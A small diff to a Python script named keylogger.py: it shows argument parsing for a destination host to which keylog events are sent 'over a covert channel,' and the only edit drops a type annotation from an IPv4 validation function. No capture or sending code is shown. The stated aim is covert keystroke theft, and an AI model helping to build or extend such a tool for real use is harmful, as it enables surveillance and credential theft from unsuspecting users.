@@ -10,7 +10,7 @@ parser = argparse.ArgumentParser("./keylogger.py")
 parser.add_argument("destination_host", help="The IPv4 address or hostname of the destination machine. All keylog events will be sent to this host over a covert channel.")
 args = parser.parse_args()
 
-def isValidIPv4(address: str) -> (bool, str):
+def isValidIPv4(address: str):
     try:
         ip = ip_address(address)
         if isinstance(ip, IPv6Address):
